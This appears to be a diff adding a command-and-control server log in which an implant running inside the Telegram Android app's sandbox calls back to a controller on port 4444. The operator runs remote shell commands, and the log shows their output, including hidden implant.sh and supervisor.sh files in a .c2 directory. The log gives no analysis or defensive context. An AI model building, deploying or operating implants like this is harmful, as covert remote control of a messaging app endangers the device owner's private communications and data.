@@ -1,0 +1,37 @@
+[2026-11-05 18:06:10] control listening on <LAN_IP>:4444
+[2026-11-05 18:06:10] logs: <HOME>/ailocal/Telegram/telegramandroidwidget/c2/logs/run-20261105-180610
+[2026-11-05 18:06:10] downloads: <HOME>/ailocal/Telegram/telegramandroidwidget/c2/downloads
+[*] waiting up to 300s for a session...
+[2026-11-05 18:06:21] session 1 hello implant=tg-10372-XQ-BT52-release uid=10372 user=u0_a372 device=XQ-BT52 pid= build=51f2ec292c357cfc from=<LAN_IP>
+>>> exec id; ls -la /data/user/0/org.telegram.messenger/files/.c2; id
+[2026-11-05 18:06:21] session 1 exec [tg-10372-XQ-BT52-release]: id; ls -la /data/user/0/org.telegram.messenger/files/.c2; id
+[+] session 1: tg-10372-XQ-BT52-release (u0_a372@XQ-BT52) from <LAN_IP>
+uid=10372(u0_a372) gid=10372(u0_a372) groups=10372(u0_a372),1079(ext_obb_rw),3002(net_bt),3003(inet),9997(everybody),20372(u0_a372_cache),50372(all_a372) context=u:r:untrusted_app:s0:c116,c257,c512,c768
+total 101
+drwx------  4 u0_a372 u0_a372  3488 2026-11-05 18:06 .
+drwxrwx--x 10 u0_a372 u0_a372 20480 2026-11-05 18:06 ..
+-rw-------  1 u0_a372 u0_a372   246 2026-11-05 18:06 .cmdq
+-rw-------  1 u0_a372 u0_a372     0 2026-11-05 18:06 .e.1
+prw-------  1 u0_a372 u0_a372     0 2026-11-05 18:06 .in
+-rw-------  1 u0_a372 u0_a372   203 2026-11-05 18:06 .o.1
+prw-------  1 u0_a372 u0_a372     0 2026-11-05 18:06 .out
+-rw-------  1 u0_a372 u0_a372    17 2026-11-05 18:06 build
+-rw-------  1 u0_a372 u0_a372     6 2026-11-05 18:06 exec.pid
+-rw-------  1 u0_a372 u0_a372    11 2026-11-05 18:06 hb
+drwx------  2 u0_a372 u0_a372  3488 2026-11-05 18:06 implant.lock
+-rw-------  1 u0_a372 u0_a372   368 2026-11-05 18:06 implant.log
+-rw-------  1 u0_a372 u0_a372     0 2026-11-05 18:06 implant.out
+-rw-------  1 u0_a372 u0_a372     6 2026-11-05 18:06 implant.pid
+-rwx------  1 u0_a372 u0_a372 30279 2026-11-05 18:06 implant.sh
+drwx------  2 u0_a372 u0_a372  3488 2026-11-05 18:06 sup.lock
+-rw-------  1 u0_a372 u0_a372   193 2026-11-05 18:06 sup.log
+-rw-------  1 u0_a372 u0_a372     0 2026-11-05 18:06 sup.out
+-rw-------  1 u0_a372 u0_a372     6 2026-11-05 18:06 sup.pid
+-rwx------  1 u0_a372 u0_a372  4275 2026-11-05 18:06 supervisor.sh
+uid=10372(u0_a372) gid=10372(u0_a372) groups=10372(u0_a372),1079(ext_obb_rw),3002(net_bt),3003(inet),9997(everybody),20372(u0_a372_cache),50372(all_a372) context=u:r:untrusted_app:s0:c116,c257,c512,c768
+[exec rc=0 1.10s]
+>>> bye
+[bye] tg-10372-XQ-BT52-release stop=0
+[2026-11-05 18:06:23] session 1 closed (peer closed)
+>>> quit
+[2026-11-05 18:06:23] server stopped
